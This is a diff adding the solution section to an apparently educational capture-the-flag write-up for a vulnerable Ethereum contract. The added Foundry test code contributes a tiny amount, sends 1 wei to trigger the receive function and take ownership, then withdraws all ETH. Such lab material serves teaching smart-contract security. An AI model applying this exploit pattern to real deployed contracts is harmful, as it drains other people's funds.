@@ -161,4 +161,20 @@ To exploit the contract, one should follow these steps:
 3. Initiate the "withdraw" function to retrieve all ETH held within the contract.
 
 ## Solution
+```
+function exploit() internal override {
+    vm.startPrank(player);
 
+    // invoke the "contribute" function with a maximum of 0.001 ether.
+    level1.contribute{value: 0.0001 ether}();
+
+    // dispatch 1 wei to the contract in order to initiate the "receive" function.
+    (bool sent, ) = address(level1).call{value: 1}("");
+    require(sent, "Failed to send Ether");
+
+    // initiate the "withdraw" function to retrieve all ETH held within the contract.
+    level1.withdraw();
+
+    vm.stopPrank();
+}
+```
